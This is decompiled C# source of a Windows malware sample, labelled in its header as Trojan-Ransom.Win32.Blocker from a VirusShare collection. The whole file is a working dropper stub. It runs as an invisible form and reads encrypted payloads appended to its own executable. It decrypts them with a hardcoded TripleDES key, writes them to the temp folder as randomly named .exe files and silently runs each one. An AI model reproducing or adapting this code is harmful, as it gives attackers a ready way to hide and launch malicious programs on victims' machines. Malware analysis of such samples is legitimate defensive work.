// Decompiled with JetBrains decompiler
// Type: AMGWUTISTHIS.Form1
// Assembly: AMGWUTISTHIS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2C85C05D-64D7-46DB-BCB4-D8785356FD4C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00019-msil\Trojan-Ransom.Win32.Blocker.ikgt-4a98d8406df84b25ff3f71f91f50a0ad239b232e12be0951038a5e63a25e6b1b.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace AMGWUTISTHIS
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("CheckBox1")]
    private CheckBox _CheckBox1;
    [AccessedThroughProperty("CheckBox2")]
    private CheckBox _CheckBox2;
    [AccessedThroughProperty("CheckBox3")]
    private CheckBox _CheckBox3;
    [AccessedThroughProperty("CheckBox4")]
    private CheckBox _CheckBox4;
    [AccessedThroughProperty("CheckBox5")]
    private CheckBox _CheckBox5;
    private static string resman;
    private static string faith = Path.GetTempPath() + "\\";
    private static string CUTEY = "|LOLPENIS|";
    private readonly byte[] key;
    private readonly byte[] iv;
    private cTripleDES des;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.key = new byte[24]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8,
        (byte) 9,
        (byte) 10,
        (byte) 11,
        (byte) 12,
        (byte) 13,
        (byte) 14,
        (byte) 15,
        (byte) 16,
        (byte) 17,
        (byte) 18,
        (byte) 19,
        (byte) 20,
        (byte) 21,
        (byte) 22,
        (byte) 23,
        (byte) 24
      };
      this.iv = new byte[8]
      {
        (byte) 8,
        (byte) 7,
        (byte) 6,
        (byte) 5,
        (byte) 4,
        (byte) 3,
        (byte) 2,
        (byte) 1
      };
      this.des = new cTripleDES(this.key, this.iv);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.CheckBox1 = new CheckBox();
      this.CheckBox2 = new CheckBox();
      this.CheckBox3 = new CheckBox();
      this.CheckBox4 = new CheckBox();
      this.CheckBox5 = new CheckBox();
      this.SuspendLayout();
      this.CheckBox1.AutoSize = true;
      CheckBox checkBox1_1 = this.CheckBox1;
      Point point1 = new Point(-8, 183);
      Point point2 = point1;
      checkBox1_1.Location = point2;
      this.CheckBox1.Name = "CheckBox1";
      CheckBox checkBox1_2 = this.CheckBox1;
      Size size1 = new Size(81, 17);
      Size size2 = size1;
      checkBox1_2.Size = size2;
      this.CheckBox1.TabIndex = 0;
      this.CheckBox1.Text = "CheckBox1";
      this.CheckBox1.UseVisualStyleBackColor = true;
      this.CheckBox2.AutoSize = true;
      CheckBox checkBox2_1 = this.CheckBox2;
      point1 = new Point(39, 204);
      Point point3 = point1;
      checkBox2_1.Location = point3;
      this.CheckBox2.Name = "CheckBox2";
      CheckBox checkBox2_2 = this.CheckBox2;
      size1 = new Size(81, 17);
      Size size3 = size1;
      checkBox2_2.Size = size3;
      this.CheckBox2.TabIndex = 1;
      this.CheckBox2.Text = "CheckBox2";
      this.CheckBox2.UseVisualStyleBackColor = true;
      this.CheckBox3.AutoSize = true;
      CheckBox checkBox3_1 = this.CheckBox3;
      point1 = new Point(47, 212);
      Point point4 = point1;
      checkBox3_1.Location = point4;
      this.CheckBox3.Name = "CheckBox3";
      CheckBox checkBox3_2 = this.CheckBox3;
      size1 = new Size(81, 17);
      Size size4 = size1;
      checkBox3_2.Size = size4;
      this.CheckBox3.TabIndex = 2;
      this.CheckBox3.Text = "CheckBox3";
      this.CheckBox3.UseVisualStyleBackColor = true;
      this.CheckBox4.AutoSize = true;
      CheckBox checkBox4_1 = this.CheckBox4;
      point1 = new Point(55, 220);
      Point point5 = point1;
      checkBox4_1.Location = point5;
      this.CheckBox4.Name = "CheckBox4";
      CheckBox checkBox4_2 = this.CheckBox4;
      size1 = new Size(81, 17);
      Size size5 = size1;
      checkBox4_2.Size = size5;
      this.CheckBox4.TabIndex = 3;
      this.CheckBox4.Text = "CheckBox4";
      this.CheckBox4.UseVisualStyleBackColor = true;
      this.CheckBox5.AutoSize = true;
      CheckBox checkBox5_1 = this.CheckBox5;
      point1 = new Point(7, 206);
      Point point6 = point1;
      checkBox5_1.Location = point6;
      this.CheckBox5.Name = "CheckBox5";
      CheckBox checkBox5_2 = this.CheckBox5;
      size1 = new Size(81, 17);
      Size size6 = size1;
      checkBox5_2.Size = size6;
      this.CheckBox5.TabIndex = 4;
      this.CheckBox5.Text = "CheckBox5";
      this.CheckBox5.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(10, 10);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.CheckBox5);
      this.Controls.Add((Control) this.CheckBox4);
      this.Controls.Add((Control) this.CheckBox3);
      this.Controls.Add((Control) this.CheckBox2);
      this.Controls.Add((Control) this.CheckBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual CheckBox CheckBox1
    {
      [DebuggerNonUserCode] get => this._CheckBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox1 = value;
    }

    internal virtual CheckBox CheckBox2
    {
      [DebuggerNonUserCode] get => this._CheckBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox2 = value;
    }

    internal virtual CheckBox CheckBox3
    {
      [DebuggerNonUserCode] get => this._CheckBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox3 = value;
    }

    internal virtual CheckBox CheckBox4
    {
      [DebuggerNonUserCode] get => this._CheckBox4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox4 = value;
    }

    internal virtual CheckBox CheckBox5
    {
      [DebuggerNonUserCode] get => this._CheckBox5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox5 = value;
    }

    private static int RandomNumber(int min, int max) => new Random().Next(min, max);

    private static string RandomString(int size, bool lowerCase)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      int num1 = checked (size - 1);
      int num2 = 0;
      while (num2 <= num1)
      {
        char ch = Convert.ToChar(Convert.ToInt32(26.0 * random.NextDouble() + 65.0));
        stringBuilder.Append(ch);
        checked { ++num2; }
      }
      return lowerCase ? stringBuilder.ToString().ToLower() : stringBuilder.ToString();
    }

    private static string GetRandom()
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append(Form1.RandomString(4, true));
      stringBuilder.Append(Form1.RandomNumber(1000, 9999));
      stringBuilder.Append(Form1.RandomString(2, false));
      return stringBuilder.ToString();
    }

    public void two() => this.three();

    public void three()
    {
      string str1 = Form1.GetRandom().ToString() + ".exe";
      string[] strArray = Strings.Split(Form1.resman, Form1.CUTEY);
      if (this.CheckBox1.Checked)
        ;
      string str2 = strArray[1];
      int num = checked (Convert.ToInt32(strArray[2]) + 2);
      int index = 3;
      while (index <= num)
      {
        FileSystem.FileOpen(1, Form1.faith + index.ToString() + str1, OpenMode.Binary);
        FileSystem.FilePut(1, this.des.DEZOR(strArray[index]), -1L, false);
        FileSystem.FileClose(1);
        try
        {
          Process.Start(Form1.faith + index.ToString() + str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      this.Close();
    }

    public void four() => FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);

    public void five() => Form1.resman = Strings.Space(checked ((int) FileSystem.LOF(1)));

    public void six() => FileSystem.FileGet(1, ref Form1.resman);

    public void SEVENZ() => FileSystem.FileClose(1);

    private void Form1_Load(object sender, EventArgs e)
    {
      this.four();
      this.five();
      this.six();
      this.SEVENZ();
      this.two();
    }

    private void checky()
    {
      if (this.CheckBox1.Checked)
      {
        this.CheckBox2.Checked = true;
      }
      else
      {
        if (this.CheckBox3.Checked)
          return;
        this.CheckBox3.Checked = true;
      }
    }
  }
}
